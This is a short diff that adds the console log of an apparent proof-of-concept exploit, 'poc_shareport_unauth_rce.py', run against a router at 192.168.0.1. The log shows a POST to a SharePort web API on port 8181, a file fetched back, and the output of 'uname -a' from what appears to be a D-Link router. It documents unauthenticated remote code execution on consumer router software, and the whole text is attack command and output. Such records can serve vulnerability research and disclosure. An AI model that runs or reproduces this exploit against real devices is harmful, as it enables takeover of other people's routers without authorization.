@@ -1,0 +1,4 @@
+# python3 poc_shareport_unauth_rce.py --target 192.168.0.1 --cmd 'uname -a'
+[*] POST :8181/dws/api/ListRoot -> 200
+[*] fetched /sp_un10a5bbxp.txt via TCP/8181
+Linux dlinkrouter 2.6.31--LSDK-9.2.0_U9.915 #1 Thu Nov 27 15:15:04 CST 2014 mips unknown
